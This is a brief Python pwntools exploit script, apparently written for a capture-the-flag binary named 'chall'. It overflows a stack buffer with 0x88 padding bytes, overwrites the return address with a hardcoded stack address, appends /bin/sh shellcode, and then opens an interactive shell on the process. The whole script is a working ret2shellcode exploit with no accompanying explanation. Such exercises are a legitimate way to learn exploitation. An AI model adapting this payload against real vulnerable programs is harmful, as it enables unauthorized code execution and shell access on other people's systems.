from pwn import *

context.binary = './chall'
context.arch = 'amd64'
context.os = 'linux'

p = process(context.binary.path)

shellcode =  asm(shellcraft.sh())
stack_addr = 0x7fffffffd9f8 + 8 # Adjust this address based on your environment
payload = b'a' * 0x88 + p64(stack_addr) + shellcode
input("wait for gdb")
p.sendlineafter(b'Send your payload:', payload) 

p.interactive()